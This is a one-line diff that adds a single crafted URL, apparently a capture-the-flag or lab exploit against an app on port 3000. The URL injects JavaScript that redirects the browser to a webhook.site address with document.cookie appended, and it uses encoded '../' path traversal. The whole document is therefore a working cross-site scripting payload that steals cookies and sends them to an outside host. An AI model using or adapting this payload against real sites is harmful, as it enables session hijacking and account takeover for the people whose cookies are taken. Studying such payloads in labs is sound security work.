@@ -1,0 +1,1 @@
+http://app:3000/a/g;location=decodeURIComponent('https%3A%2F%2Fwebhook.site%2F82f0409c-3416-4da0-a3c2-5168bd6f05ec%3F'+document.cookie)//a%2F..%2F..%2F..%2F..%2F..%2Findex.html
